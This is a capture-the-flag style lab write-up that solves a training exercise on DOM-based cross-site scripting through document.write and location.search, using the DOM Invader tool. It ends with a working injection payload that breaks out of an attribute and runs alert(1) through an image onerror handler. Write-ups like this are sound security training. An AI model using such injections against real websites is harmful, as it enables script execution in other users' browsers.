## 3 - DOM XSS in document.write sink using source location.search

This lab contains a DOM-based cross-site scripting vulnerability in the search query tracking functionality. It uses the JavaScript document.write function, which writes data out to the page. The document.write function is called with data from location.search, which you can control using the website URL.

To solve this lab, perform a cross-site scripting attack that calls the alert function.

## Notes

- Search page
- Possibility to leave a comment
- `/resources/images/tracker.gif?searchTerms=`

## Resume

1. Go on search page
2. Using DOM invader type the canary in **search**
3. Open DOM invader and **Search for Canary**
4. Exploit the DOM XSS

## Solve

Enable DOM invader and go on `/?search=` and paste the random **canary** from DOM invader in the search feature : 

`/?search=ec7oxw8l`

Open DOM invader and click on **Search for Canary** and see : 

Sinks (1)
    document.write (1)
| Value | outerHTML | Frame path | Event | Options |
|---|---|---|---|---|
| `ec7oxw8l` |  | top |  | **Exploit** |

Stack Trace

```txt
at _0x525c48 (chrome-extension://gehfgfhfflemphlbndclgpcbedhdddbf/content-scripts/augmented-dom-instrumentation.js:1:539463)
at Object.AWGqn (chrome-extension://gehfgfhfflemphlbndclgpcbedhdddbf/content-scripts/augmented-dom-instrumentation.js:1:74616)
at Object.MqhPT (chrome-extension://gehfgfhfflemphlbndclgpcbedhdddbf/content-scripts/augmented-dom-instrumentation.js:1:340129)
at Object.IFiFJ (chrome-extension://gehfgfhfflemphlbndclgpcbedhdddbf/content-scripts/augmented-dom-instrumentation.js:1:366377)
at HTMLDocument.write (chrome-extension://gehfgfhfflemphlbndclgpcbedhdddbf/content-scripts/augmented-dom-instrumentation.js:1:367856)
at trackSearch (https://0a3700be04c0885280b5120f00290096.web-security-academy.net/?search=ec7oxw8l:61:38)
at https://0a3700be04c0885280b5120f00290096.web-security-academy.net/?search=ec7oxw8l:65:29
```

Then click on **Exploit** and follow the redirection to : 

```
/?search="%27><img%20src%20onerror=alert(1)>
```

```js
"'><img src onerror=alert(1)>
```